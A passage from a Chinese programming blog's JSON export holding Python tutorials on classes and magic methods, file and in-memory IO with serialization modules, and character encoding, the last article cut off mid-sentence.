Xxx…来定义类，但是，type()函数也允许我们动态创建出类来，也就是说，动态语言本身支持运行期动态创建类，这和静态语言有非常大的不同，要在静态语言运行期创建类，必须构造源代码字符串再调用编译器，或者借助一些工具生成字节码实现，本质上都是动态编译，会非常复杂。 除了使用type()动态创建类以外，要控制类的创建行为，还可以使用metaclass。 metaclass，直译为 元类 ，简单的解释就是： 当我们定义了类以后，就可以根据这个类创建出实例，所以：先定义类，然后创建实例。 但是如果我们想创建出类呢？那就必须根据metaclass创建出类，所以：先定义metaclass，然后创建类。 连接起来就是：先定义metaclass，就可以创建类，最后创建实例。 所以，metaclass允许你创建类或者修改类。换句话说，你可以把类看成是metaclass创建出来的“实例”。 来个例子感受一下，按照默认习惯，metaclass的类名总是以Metaclass结尾，以便清楚地表示这是一个metaclass： 12345# metaclass是类的模板，所以必须从`type`类型派生：class ListMetaclass(type): def __new__(cls, name, bases, attrs): attrs['add'] = lambda self, value: self.append(value) return type.__new__(cls, name, bases, attrs) 有了ListMetaclass，我们在定义类的时候还要指示使用ListMetaclass来定制类，传入关键字参数metaclass： 12class MyList(list, metaclass=ListMetaclass): pass 当我们传入关键字参数metaclass时，魔术就生效了，它指示Python解释器在创建MyList时，要通过ListMetaclass.new()来创建，在此，我们可以修改类的定义，比如，加上新的方法，然后，返回修改后的定义。 new()方法接收到的参数依次是： 当前准备创建的类的对象； 类的名字； 类继承的父类集合； 类的方法集合。 0x13抽象类抽象类中只能有抽象方法，子类继承抽象类时，不能通过实例化使用其抽象方法，必须实现该方法。 1234567891011121314from abc import ABCMeta,abstractmethod #class Fruit(metaclass=ABCMeta): @abstractmethod def grow(self): passclass Apple(Fruit): def grow(self): print('Apple growing')if __name__==\"__main__\": apple=Apple() apple.grow()output:Apple growing 0x14类的内置方法在上面有提到除了init之外还有iter,reverse的方法，这里就详细说下除了init初始化还有哪些别的方法。 1234567891011121314__init__ : 构造函数，在生成对象时调用__del__ : 析构函数，释放对象时使用__repr__ : 打印，转换__setitem__ : 按照索引赋值__getitem__: 按照索引获取值__len__: 获得长度__cmp__: 比较运算__call__: 调用__add__: 加运算__sub__: 减运算__mul__: 乘运算__div__: 除运算__mod__: 求余运算__pow__: 幂 具体使用： doc说明性文档和信息。Python自建，无需自定义。 12345678910class Foo: \"\"\" 描述类信息，可被自动收集 \"\"\" def func(self): pass# 打印类的说明文档 print(Foo.__doc__)output: 描述类信息，可被自动收集 init()实例化方法，通过类创建实例时，自动触发执行。 12345class Foo: def __init__(self, name): self.name = name self.age = 18obj = Foo(jack') # 自动执行类中的 __init__ 方法 module__ 和 __classmodule 表示当前操作的对象在属于哪个模块。class 表示当前操作的对象属于哪个类。这两者也是Python内建，无需自定义。 123456789class Foo: passobj = Foo()print(obj.__module__)print(obj.__class__)output:__main__&lt;class '__main__.Foo'&gt; del()析构方法，当对象在内存中被释放时，自动触发此方法。 注：此方法一般无须自定义，因为Python自带内存分配和释放机制，除非你需要在释放的时候指定做一些动作。析构函数的调用是由解释器在进行垃圾回收时自动触发执行的。 1234567class Foo: def __del__(self): print(\"我被回收了！\")obj = Foo()del obj# call() call()如果为一个类编写了该方法，那么在该类的实例后面加括号，可会调用这个方法。 注：构造方法的执行是由类加括号执行的，即：对象 = 类名()，而对于call() 方法，是由对象后加括号触发的，即：对象() 或者 类()() 1234567class Foo: def __init__(self): pass def __call__(self, *args, **kwargs): print('__call__')obj = Foo() # 执行 __init__obj() # 执行 __call__ 可以用Python内建的callable()函数进行测试，判断一个对象是否可以被执行。 1callable(Student()) 运行结果： 1True dict列出类或对象中的所有成员！非常重要和有用的一个属性，Python自建，无需用户自己定义 1234567891011121314151617181920class Province: country = 'China' def __init__(self, name, count): self.name = name self.count = count def func(self, *args, **kwargs): print('func')# 获取类的成员print(Province.__dict__)# 获取 对象obj1 的成员obj1 = Province('HeBei',10000)print(obj1.__dict__)# 获取 对象obj2 的成员obj2 = Province('HeNan', 3888)print(obj2.__dict__)output:&#123;'__module__': '__main__', 'country': 'China', '__init__': &lt;function Province.__init__ at 0x000001B139C6A048&gt;, 'func': &lt;function Province.func at 0x000001B139C6A1E0&gt;, '__dict__': &lt;attribute '__dict__' of 'Province' objects&gt;, '__weakref__': &lt;attribute '__weakref__' of 'Province' objects&gt;, '__doc__': None&#125;&#123;'name': 'HeBei', 'count': 10000&#125; str()如果一个类中定义了str()方法，那么在打印对象时，默认输出该方法的返回值。这也是一个非常重要的方法，需要用户自己定义。 下面的类，没有定义str()方法，打印结果是： 1234567891011121314class Foo: passobj = Foo()print(obj)#定义了__str__()方法后，打印结果是：'jack'。class Foo: def __str__(self): return 'jack'obj = Foo()print(obj)output:&lt;__main__.Foo object at 0x00000267B25CC780&gt;jack getitem__()、setitem()、__delitem()取值、赋值、删除这“三剑客”的套路，在Python中，我们已经见过很多次了，比如前面的@property装饰器。 Python中，标识符后面加圆括号，通常代表执行或调用方法的意思。而在标识符后面加中括号[]，通常代表取值的意思。Python设计了getitem()、setitem()、delitem()这三个特殊成员，用于执行与中括号有关的动作。它们分别表示取值、赋值、删除数据。 也就是如下的操作： a = 标识符[] ： 执行getitem方法标识符[] = a ： 执行setitem方法del 标识符[] ： 执行delitem方法如果有一个类同时定义了这三个魔法方法，那么这个类的实例的行为看起来就像一个字典一样，如下例所示： 1234567891011class Foo: def __getitem__(self, key): print('__getitem__',key) def __setitem__(self, key, value): print('__setitem__',key,value) def __delitem__(self, key): print('__delitem__',key)obj = Foo()result = obj['k1'] # 自动触发执行 __getitem__obj['k2'] = 'jack' # 自动触发执行 __setitem__del obj['k1'] # 自动触发执行 __delitem__ iter()这是迭代器方法！列表、字典、元组之所以可以进行for循环，是因为其内部定义了 iter()这个方法。如果用户想让自定义的类的对象可以被迭代，那么就需要在类中定义这个方法，并且让该方法的返回值是一个可迭代的对象。当在代码中利用for循环遍历对象时，就会调用类的这个iter()方法。 普通的类： 1234567class Foo: passobj = Foo()for i in obj: print(i)# 报错：TypeError: 'Foo' object is not iterable# 原因是Foo对象不可迭代 添加一个iter()，但什么都不返回： 12345678class Foo: def __iter__(self): passobj = Foo()for i in obj: print(i)# 报错：TypeError: iter() returned non-iterator of type 'NoneType'#原因是 __iter__方法没有返回一个可迭代的对象 返回一个个迭代对象： 12345678class Foo: def __init__(self, sq): self.sq = sq def __iter__(self): return iter(self.sq)obj = Foo([11,22,33,44])for i in obj: print(i) 最好的方法是使用生成器： 12345678910class Foo: def __init__(self): pass def __iter__(self): yield 1 yield 2 yield 3obj = Foo()for i in obj: print(i) len()在Python中，如果你调用内置的len()函数试图获取一个对象的长度，在后台，其实是去调用该对象的len()方法，所以，下面的代码是等价的： 1234len('ABC')3'ABC'.__len__()3 Python的list、dict、str等内置数据类型都实现了该方法，但是你自定义的类要实现len方法需要好好设计。 repr()这个方法的作用和str()很像，两者的区别是str()返回用户看到的字符串，而repr()返回程序开发者看到的字符串，也就是说，repr()是为调试服务的。通常两者代码一样。 123456class Foo: def __init__(self, name): self.name = name def __str__(self): return \"this is %s\" % self.name __repr__ = __str__ add__: 加运算 sub: 减运算 mul: 乘运算 div: 除运算 mod: 求余运算 __pow: 幂运算这些都是算术运算方法，需要你自己为类设计具体运算代码。有些Python内置数据类型，比如int就带有这些方法。Python支持运算符的重载，也就是重写。 1234567891011class Vector: def __init__(self, a, b): self.a = a self.b = b def __str__(self): return 'Vector (%d, %d)' % (self.a, self.b) def __add__(self,other): return Vector(self.a + other.a, self.b + other.b)v1 = Vector(2,10)v2 = Vector(5,-2)print (v1 + v2) author作者信息1234__author__ = \"Jack\"def show(): print(__author__)show() slotsPython作为一种动态语言，可以在类定义完成和实例化后，给类或者对象继续添加随意个数或者任意类型的变量或方法，这是动态语言的特性。例如： 123456789101112131415def print_doc(self): print(\"haha\")class Foo: passobj1 = Foo()obj2 = Foo()# 动态添加实例变量obj1.name = \"jack\"obj2.age = 18# 动态的给类添加实例方法Foo.show = print_docobj1.show()obj2.show() 但是！如果我想限制实例可以添加的变量怎么办？可以使slots限制实例的变量，比如，只允许Foo的实例添加name和age属性。 1234567891011121314151617181920def print_doc(self): print(\"haha\")class Foo: __slots__ = (\"name\", \"age\") passobj1 = Foo()obj2 = Foo()# 动态添加实例变量obj1.name = \"jack\"obj2.age = 18obj1.sex = \"male\" # 这一句会弹出错误# 但是无法限制给类添加方法Foo.show = print_docobj1.show()obj2.show()由于'sex'不在__slots__的列表中，所以不能绑定sex属性，试图绑定sex将得到AttributeError的错误。Traceback (most recent call last): File \"F:/Python/pycharm/201705/1.py\", line 14, in &lt;module&gt; obj1.sex = \"male\"AttributeError: 'Foo' object has no attribute 'sex' 需要提醒的是，slots定义的属性仅对当前类的实例起作用，对继承了它的子类是不起作用的。想想也是这个道理，如果你继承一个父类，却莫名其妙发现有些变量无法定义，那不是大问题么？如果非要子类也被限制，除非在子类中也定义slots，这样，子类实例允许定义的属性就是自身的slots加上父类的slots。参考文章:https://mp.weixin.qq.com/s/jEKvWwu5MwCqLbIxmAP4iQPython 面向对象编程容易忽视的知识点:https://www.jianshu.com/p/505117d9a693陷阱！python参数默认值https://segmentfault.com/a/1190000000743526一篇文章搞懂python面向对象编程:http://yangcongchufang.com/%E9%AB%98%E7%BA%A7python%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/python-object-class.html#dir1Python面向对象编程https://zhuanlan.zhihu.com/p/34305989","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"类","slug":"类","permalink":"https://blog.cfyqy.com/tags/%E7%B1%BB/"}],"author":"ye1s"},{"title":"python的IO编程","slug":"ython的文件操作","date":"2019-05-29T10:48:00.000Z","updated":"2020-04-13T08:25:59.650Z","comments":true,"path":"article/2133739f.html","link":"","permalink":"https://blog.cfyqy.com/article/2133739f.html","excerpt":"IO编程包含文件读写及其操作、内存读写。","text":"IO编程包含文件读写及其操作、内存读写。 IO 在编程语言中特指输入和输出「即 input 和 output」。在 IO 编程中 stream （流）是一个重要的概念，一个完整的 IO 操作通常含有 input 和 output 两个数据流，我们称之为输入流和输出流。由于 CPU 和内存的速度远远超过外设的速度，因此 IO 操作通常分为同步和异步两种方式，我们生活中所使用的操作系统通常情况下设计到 IO 操作的均使用的是异步 IO。那么同步 IO 和异步 IO 的区别是什么 同步 IO：即在遇到外设读取数据时，CPU 停止后续代码的执行，等待 IO 读取完成在接着执行剩余的代码。 异步 IO：即在遇到外设读取数据时，CPU 继续执行其他的代码，待 IO 读取完成在返回处理相关数据。 同步 IO 和异步 IO 最大的区别在遇到外设长时间读取数据时，CPU 是否等待 IO 的执行结果 0x1文件操作0x1.1文件的打开文件的打开语法: 1f = open(name[， mode[， buffering]]) 各字段含义：name: 所要打开的文件的名称，mode：打开文件的方式: 12345678't' : 文本模式(默认)'x' : 写模式，新建一个文件，如果该文件已存在则会报错。‘r’ : 读模式'w' : 写模式'a' : 追加模式'b' : 二进制模式（可添加到其他模式中使用）'+' : 读写模式（可添加到其他模式中使用）'U' : 就是支持所有的换行模式，也就说‘\\r’ '\\n' '\\r\\n'都可表示换行，会有一个tuple用来存贮这个文件中用到过的换行符。 buffering : 是否要缓冲 12340 / False ： 代表无缓冲1 / True ： 代表有缓冲大于一的数字： 代表缓冲区大小（单位是字节）-1 : 默认系统缓冲区大小 上面mode列出的是基本模式，实际应用中的扩展模式有： 12345678\"r\" 以读方式打开，只能读文件，如果文件不存在，会发生异常。\"w\" 以写方式打开，只能写文件， 如果文件不存在，创建该文件。如果文件已存在，先清空，再打开文件。\"rb\" 以二进制读方式打开，只能读文件 ， 如果文件不存在，会发生异常\"wb\" 以二进制写方式打开，只能写文件， 如果文件不存在，创建该文件；如果文件已存在，先清空，再打开文件\"rt\" 以文本读方式打开，只能读文件 ， 如果文件不存在，会发生异常\"wt\" 以文本写方式打开，只能写文件， 如果文件不存在，创建该文件，如果文件已存在，先清空，再打开文件 。\"rb+\" 以二进制读方式打开，可以读、写文件 ， 如果文件不存在，会发生异常\"wb+\" 以二进制写方式打开，可以读、写文件， 如果文件不存在，创建该文件。如果文件已存在，先清空，再打开文件。 0x1.2字节读取 read 12f.read(num) //读出num个字节f.read() //读出全部字节 write1f.write(string) //将string写入文件 0x1.3行读写1234F.readline([size]) #读一行，如果定义了size，size的单位是byte，有可能返回的只是一行的一部分F.readlines([size]) #把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。F.write(str) #把str写到文件中，write()并不会在str后加上一个换行符F.writelines(seq) #把seq的内容全部写到文件中。这个函数也只是忠实地写入，不会在每行后面加上任何东西。 0x1.4关闭文件12345fd.close()#可以在打开文件时使用with关键字，它会帮我们自动的关闭文件：with open(path, 'r') as f: // do something 0x1.5codecs其实Python对多国语言的处理是支持的很好的，它可以处理当下任意编码的字符。 有一点需要清楚的是，当python要做编码转换的时候，会借助于内部的编码，转换过程是这样的： 原有编码 -&gt; 内部编码 -&gt; 目的编码 而codecs提供的方法可以指定一个编码打开文件，使用这个方法打开的文件读取返回的将是unicode。写入时，如果参数是unicode，则使用open()时指定的编码进行编码后写入；如果是str，则先根据源代码文件声明的字符编码，解码成unicode后再进行前述 操作。相对内置的open()来说，这个方法不容易在编码上出现问题。所以，推荐大家在文件读写的时候使用codecs python的内部是使用unicode来处理的，但是unicode的使用需要考虑的是它的编码格式有两种，一是UCS-2，它一共有65536个码位，另一种是UCS-4，它有2147483648g个码位。 判断安装的python是用什么编码方式： 12import sysprint(sys.maxunicode) 如果输出的值为65535,那么就是UCS-2,如果输出是1114111就是UCS-4编码。 转换成内部码： 123456789101112131415161718c = \"风卷残云\"print(type(c))c = bytes(c,encoding='utf-8')print(type(c))print(c)b = codecs.decode(c, \"utf-8\") #与c.decode()等效print(type(b))print(b)print(c.decode())输出:&lt;class 'str'&gt;&lt;class 'bytes'&gt;b'\\xe9\\xa3\\x8e\\xe5\\x8d\\xb7\\xe6\\xae\\x8b\\xe4\\xba\\x91'&lt;class 'str'&gt;风卷残云风卷残云 在python3.x中可以直接将bytes类型的数据转换成其他编码格式，而不用手动先转成unicode。 12345678910import codecsa = \"你好世界\"# 创建utf-8编码器look = codecs.lookup('utf-8')type(a)a = bytes(a,encoding='utf-8')b = look.decode(a)print(b)输出:('你好世界', 12) 返回的元组中b[0]是数据，b[1]是长度用codecs提供的open方法来指定打开的文件的语言编码，它会在读取的时候自动转换为内部unicode 1f = codecs.open(filepath, 'r', 'utf8') 0x2 目录文件操作x02.1os 模块1234567891011121314151617181920212223242526os.sep 可以取代操作系统特定的路径分隔符。windows下为 '\\\\'os.name 字符串指示你正在使用的平台。比如对于Windows，它是'nt'，而对于Linux/Unix用户，它是 'posix'os.getcwd() 函数得到当前工作目录，即当前Python脚本工作的目录路径os.getenv() 获取一个环境变量，如果没有返回noneos.putenv(key, value) 设置一个环境变量值os.listdir(path) 返回指定目录下的所有文件和目录名os.remove(path) 函数用来删除一个文件os.system(command) 函数用来运行shell命令os.linesep 字符串给出当前平台使用的行终止符。例如，Windows使用 '\\r\\n'，Linux使用 '\\n' 而Mac使用 '\\r'os.path.split(path) 函数返回一个路径的目录名和文件名os.path.isfile() 和os.path.isdir()函数分别检验给出的路径是一个文件还是目录os.path.exists() 函数用来检验给出的路径是否真地存在os.curdir 返回当前目录 ('.')os.mkdir(path) 创建一个目录os.makedirs(path) 递归的创建目录os.chdir(dirname) 改变工作目录到dirname os.path.getsize(name) 获得文件大小，如果name是目录返回0Los.path.abspath(name) 获得绝对路径os.path.normpath(path) 规范path字符串形式os.path.splitext() 分离文件名与扩展名os.path.join(path,name) 连接目录与文件名或目录os.path.basename(path) 返回文件名os.path.dirname(path) 返回文件路径os.walk(top,topdown=True,onerror=None) 遍历迭代目录os.rename(src, dst) 重命名file或者directory src到dst 如果dst是一个存在的directory, 将抛出OSError. 在Unix, 如果dst在存且是一个file, 如果用户有权限的话，它将被安静的替换. 操作将会失败在某些Unix 中如果src和dst在不同的文件系统中. 如果成功, 这命名操作将会是一个原子操作 (这是POSIX 需要). 在 Windows上, 如果dst已经存在, 将抛出OSError，即使它是一个文件. 在unix，Windows中有效。os.renames(old, new) 递归重命名文件夹或者文件。像rename() 0x2.2shutil模块12345678910shutil.copyfile( src, dst) 从源src复制到dst中去。当然前提是目标地址是具备可写权限。抛出的异常信息为IOException. 如果当前的dst已存在的话就会被覆盖掉shutil.move( src, dst) 移动文件或重命名shutil.copymode( src, dst) 只是会复制其权限其他的东西是不会被复制的shutil.copystat( src, dst) 复制权限、最后访问时间、最后修改时间shutil.copy( src, dst) 复制一个文件到一个文件或一个目录shutil.copy2( src, dst) 在copy上的基础上再复制文件最后访问时间与修改时间也复制过来了，类似于cp –p的东西shutil.copy2( src, dst) 如果两个位置的文件系统是一样的话相当于是rename操作，只是改名；如果是不在相同的文件系统的话就是做move操作shutil.copytree( olddir, newdir, True/Flase)把olddir拷贝一份newdir，如果第3个参数是True，则复制目录时将保持文件夹下的符号连接，如果第3个参数是False，则将在复制的目录下生成物理副本来替代符号连接shutil.rmtree( src ) 递归删除一个目录以及目录内的所有内容 0x2.3glob例如当我们想要列出当前目录中所有扩展名为.jpg或.gif的文件的时候 123import globfilelist = glob.glob('*.jpg') + glob.glob('*.gif')print(filelist) 0x3序列化我们把变量从内存中变成可存储或传输的过程称之为序列化。序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化。 python的序列化可用pickle和json模块 json：用于（不同平台和多语言）字符串和python数据类型进行转换 pickle：用于python特有的类型和python的数据类型间进行转换（所有python数据类型） 0x3.1picklePython提供两个模块来实现序列化：cPickle和pickle。这两个模块功能是一样的，区别在于cPickle是C语言写的，速度快，pickle是纯Python写的，速度慢。python3中已经没有cPickle模块pickle模块的作用: 可以将对象转换为一种可以传输或存储的格式。 pickle模块将任意一个python对象换成一个系统字节的操作过程叫做串行化对象。 pickle模块实现了python的所有数据序列化和反序列化。它不是用于多种语言间的传输，它仅作为python对象的持久化或者python程序间进行互相传输对象的。 dump和dumps的区别： dump是将对象序列化并保存到文件中 dumps是将对象序列化 load和loads的区别： load将序列化字符串从文件读取并反序列化 loads将序列化字符串反序列化 范例: 123456789101112131415161718192021import pickledata1=[1,'a',2,'b',3,'c']pi=pickle.dumps(data1) #序列化对象print(pi)print(pickle.loads(pi)) #反序列胡对象f=open('output.txt','wb')data2=['py','th','on','123']pickle.dump(data2,f) #序列化对象到文件f=open('output.txt','rb')read=pickle.load(f)#文件中发序列化对象print(read)output:b'\\x80\\x03]q\\x00(K\\x01X\\x01\\x00\\x00\\x00aq\\x01K\\x02X\\x01\\x00\\x00\\x00bq\\x02K\\x03X\\x01\\x00\\x00\\x00cq\\x03e.'[1, 'a', 2, 'b', 3, 'c']['py', 'th', 'on', '123'][Finished in 0.2s] 0x3.2jsonjson.dumps()是将字典类型转化成字符串类型。json.loads()将字符串类型转化成字典类型json.dump()用于将dict类型的数据转成str，并写入到json文件中json.load()用于从json文件中读取数据。范例： 123456789101112131415161718import jsondata1=&#123;'a':1,'b':2,'c':3&#125;dus=json.dumps(data1)#将字典类型转化成字符串类型print(dus,type(dus))los=json.loads(dus)print(los,type(los))#将字符串类型转化成字典类型data2=&#123;'a':'4','b':'5','c':'6'&#125;with open('input.txt','w') as f: #用于将dict类型的数据转成str，并写入到json文件中 json.dump(data2,f)with open(\"input.txt\",'r') as f1:#用于从json文件中读取数据。 print(json.load(f1))output:&#123;\"a\": 1, \"b\": 2, \"c\": 3&#125; &lt;class 'str'&gt;&#123;'a': 1, 'b': 2, 'c': 3&#125; &lt;class 'dict'&gt;&#123;'a': '4', 'b': '5', 'c': '6'&#125; 0x3.3shelveshelve是通过key，value将内存中的数据通过文件存储的方式实现持久化，可以支持任何pickle所支持的任何Python数据格式： 123456789import shelved = shelve.open(\"shelve_test\")name = \"python\"info = &#123;\"age\":21,\"sex\":\"man\"&#125;d[\"name\"] = named[\"info\"] = infod.close() 此时就已经完成了将内存数据持久化的一个过程，执行完毕之后，在当前目录下回生成一个名为“shelve_test.db”的文件。那么，我们又该如何将数据取出来呢，请看接下来的操作 12345import shelved = shelve.open(\"shelve_test\")name = d[\"name\"]info = d[\"info\"]d.close() 此时就将数据从磁盘中从新取出来，放置在内存中，我们就可以对它进行操作了。 0x4内存读写python 通过 StringIO 和 BytesIO 来读写内存中的数据。 0x4.1StringIOStringIO 顾名思义就是读写内存中的字符串。StringIO的行为与file对象非常像，但它不是磁盘上文件，而是一个内存里的“文件”，我们可以像操作磁盘文件那样来操作StringIO简单实例: 1234567#!/usr/bin/env python3#-*- coding:utf-8 -*-import iof = io.StringIO()f.write(\"hello world!\")print(f.getvalue()) f=StringIO.StringIO([buf])此实例类似于open方法，不同的是它并不会在硬盘中生成文件，而只寄存在缓冲区；可选参数buf是一个str或unicode类型。它将会与其他后续写入的数据存放在一起（注意，若要在初始化数据之后继续写入数据，则在写入数据之前，应先将读写位置移动到结尾，然后再写入，否则，初始化数据会被覆盖掉，因为读写位置默认是0）。 StringIO类中的方法： 方法 描述 f.read([n]) 参数n限定读取长度，int类型；缺省状态为从当前读写位置读取对象s中存储的所有数据。读取结束后，读写位置被移动。 f.readline([length]) 参数length限定读取的结束位置，int类型，缺省状态为None：从当前读写位置读取至下一个以“\\n”为结束符的当前行。读写位置被移动。 f.readlines([sizehint]) 参数sizehint为int类型，缺省状态为读取所有行并作为列表返回，除此之外从当前读写位置读取至下一个以“\\n”为结束符的当前行。读写位置被移动。 f.write(s) 从读写位置将参数s写入给对象s。参数s为str或unicode类型。读写位置被移动。 f.writelines(list) 读写位置将list写入给对象s。参数list为一个列表，列表的成员为str或unicode类型。读写位置被移动。 f.getvalue() 此函数没有参数，无论读写位置在哪里，都能够返回对象s中的所有数据。 f.truncate([size]) 1》有size参数,无论读写位置在哪里，都从起始位置开始，裁剪size字节的数据。2》不带size参数,将当前读写位置之前的数据，裁剪下来。 f.tell() 返回当前读写位置。 f.seek(pos[,mode]) 移动当前读写位置至pos处，可选参数mode为0时将读写位置移动至pos处，为1时将读写位置从当前位置起向前或向后移动pos个长度，为2时将读写位置置于末尾处再向前或向后移动pos个长度；mode的默认值为0。 f.close() 释放缓冲区，执行此函数后，数据将被释放，也不可再进行操作。 f.isatty() 此函数总是返回0。 f.flush() 刷新内部缓冲区。 0x4.2BytesIOBytesIO 用来读写内存中的二进制数据。例子: 1234567#!/usr/bin/env python3#-*- coding:utf-8 -*-import iof = io.BytesIO()f.write('keinYe'.encode('utf-8'))print(f.getvalue()) 参考文章:python文件操作（一）基础文件操作:http://www.361way.com/python-file-basics/4627.htmlPython IO 编程 http://keinye.com/2019/02/python-base-io/Python StringIO实现内存缓冲区中读写数据https://www.cnblogs.com/misswangxing/p/7921665.htmlPython 中文件 I/O 高效操作处理的技巧https://juejin.im/entry/58ec780f8d6d810058056396廖雪峰的官方网站 https://www.liaoxuefeng.com/wiki/897692888725344/92303055545616 python中转换模块codecs的讲解 http://www.php.cn/python-tutorials-412484.html python–序列化（dump和dumps的区别、load和loads的区别、json与pickle模块的区别） https://blog.csdn.net/qq_44525050/article/details/87947301","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"文件操作","slug":"文件操作","permalink":"https://blog.cfyqy.com/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"}],"author":"ye1s"},{"title":"python的编码与解码","slug":"python的编码","date":"2019-05-29T01:59:00.000Z","updated":"2020-04-13T08:17:49.220Z","comments":true,"path":"article/8fa1fc40.html","link":"","permalink":"https://blog.cfyqy.com/article/8fa1fc40.html","excerpt":"在python中经常会遇到乱码问题，总是折腾半天，该花点时间来学习一下啦。","text":"在python中经常会遇到乱码问题，总是折腾半天，该花点时间来学习一下啦。 详细可看此三篇文章:字符编码详解：https://www.xjimmy.com/python-6-code.htmlPython2编码: https://foofish.net/why-python-encoding-is-tricky.htmlPython3编码; https://foofish.net/how-python3-handle-charset-encoding.html 0x1字符编码与乱码0x1.1字节与字符 计算机存储的一切数据，文本字符、图片、视频、音频、软件都是由一串01的字节序列构成的，一个字节等于8个比特位。 而字符就是一个符号，比如一个汉字、一个英文字母、一个数字、一个标点都可以称为一个字符。 字节方便存储和网络传输，而字符用于显示，方便阅读。例如字符 “p” 存储到硬盘是一串二进制数据 01110000，占用一个字节的长度 0x1.2编码与解码 我们用编辑器打开的文本，看到的一个个字符，最终保存在磁盘的时候都是以二进制字节序列形式存起来的。那么从字符到字节的转换过程就叫做编码（encode），反过来叫做解码（decode），两者是一个可逆的过程。 编码是为了存储传输，解码是为了方便显示阅读。 0x1.3什么是字符编码 我们知道，计算机只处理二进制的数据，所以，我们最终的代码都会编译成计算机能识别的二进制数据。比如字母A，对应二进制数1011，字母B，对应二进数1100等等，这种我们能看到的、使用到的字符和计算机能处理的二进制数字的对应关系，就可以绘制一张对应表，这就是字符编码表。 0x1.4乱码的产生根本原因就是：对同一个字符串在读和写的时候，使用了不同的字符编码表 比如，我们用GBK字符编码来解释字符串‘你好，世界’，编译成二进制数是“1010”，然后我们在读取的时候，用了其他字符编码‘utf-8’，那么在‘utf-8’字符编码表看来，你这个二进制“1010”代表的就不是字符串“我爱你”，可能其他乱七八糟的东西，这样就产生了乱码。 0x2常用的字符编码0x2.1ASCII编码 最早的字符编码，包含字母、数字和一些常见的符号，只有一个字节，所以最多能表示 28=256 个字符数。由于计算机是美国人发明的，所以ASCII编码表只有127个字符，因为在他们看来，已经足够用了，比如大写字母A的编码是65，小写字母z的编码是122。所以如果你的代码中只出现在127个字符中的字母、数字或者符合，用ASCII编码已经可以使你的代码在所有平台上运行都不会出现乱码问题，因为其他的编码基本都会兼容ASCII。 0x2.2ISO-8859-1 既然ASCII只能表示128个字符，显示是不能完全表示完的，所以ISO-8859-1扩展了ASCII编码，在ASCII编码之上又增加了西欧语言、希腊语、泰语、阿拉伯语、希伯来语对应的文字符号，它是向下兼容ASCII编码的。ISO-8859-1也是单字节编码，但它是一个8位的容器，它能表示256个字符。 *0x2.3GB2312/GBK * 中国博大精深的汉字当然无法用ASCII编码来表示了，那么我们国人就自己定义了适合中国汉字的编码表——GB2312/GBK。这就是汉字的国标码，专门用来表示汉字，是双字节编码，。其中gbk编码能够用来同时表示繁体字和简体字，而gb2312只能表示简体字，gbk是兼容gb2312编码的。 0x2.4unicode 你可以想得到的是，全世界有上百种语言，类似的，日文和韩文等其他语言也有这个问题。为了统一所有文字的编码，Unicode 应运而生。Unicode 把所有语言都统一到一套编码里，这样就不会再有乱码问题了，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，规定最少2个字节（16位），即：216 = 65536，注意：此处说的的是最少2个字节，可能更多。 0x2.5UTF-16 UTF-16是UNICODE的具体实现，16即16位，UTF-16即是这个来由，定义了UNICODE字符在计算机中的存储方式，UTF-16同样使用了两个字节来表示任何字符，这样使得操作字符串非常高效，这也是java把UTF-16作为字符在内存中存储的格式的重要原因。UTF-16适合在磁盘与内存之间使用，字符和字节的相互转换会更加简单和高效，但不适合在网络上传输，因为网络传输可能会损坏字节流。 0x2.6UTF-8 使用全部使用Unicode编码，虽然解决了乱码问题，但是随即又产生了一个新问题，资源浪费！怎么说呢，因为Unicode编码是最少2个字节的，也就是说之前用ASCII编码表示的字母A，本来一个字节就可以表示的东西，现在需要多一倍的的存储空间。所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码，UTF-8是Unicode的扩展之一，还有什么UTF-9，UTF-16什么的，比较少用，最常用的还是UTF-8。UTF-8编码可以把一个Unicode字符根据实际大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。 字符 ASCII Unicode UTF-8 A 01000001 00000000 01000001 01000001 中 X 01001110 00101101 11100100 10111000 10101101 0x2.7编码总结 UTF是为unicode编码设计的一种在存储和传输时节省空间的编码方案。在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。 比如：用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：注意下图不同状态对应不同的编码格式。 0x3python2的编码python中字符串的缺陷:使用 ASCII 码作为默认编码方式，对中文处理很不友好。把字符串的牵强地分为 unicode 和 str 两种类型，误导开发者 0x3.1python 2中默认编码查看和转换12345678910#查看默认字符编码&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.getdefaultencoding()'ascii’ #设置默认字符编码&gt;&gt;&gt; reload(sys)&gt;&gt;&gt; sys.setdefaultencoding(\"utf-8\")&gt;&gt;&gt; sys.getdefaultencoding()'utf-8' 0x3.2str与unicodePython2 把字符串分为 unicode 和 str 两种类型。本质上 str 是一串二进制字节序列，下面的示例代码可以看出 str 类型的 “禅” 打印出来是十六进制的 \\xec\\xf8 ，对应的二进制字节序列就是 ‘11101100 11111000 12345&gt;&gt;&gt; s = '禅'&gt;&gt;&gt; s'\\xec\\xf8'&gt;&gt;&gt; type(s)&lt;type 'str'&gt; 而 unicode 类型的 u”禅” 对应的 unicode 符号是 u’\\u7985’ 12345&gt;&gt;&gt; u = u\"禅\"&gt;&gt;&gt; uu'\\u7985'&gt;&gt;&gt; type(u)&lt;type 'unicode'&gt; 我们要把 unicode 符号保存到文件或者传输到网络就需要经过编码处理转换成 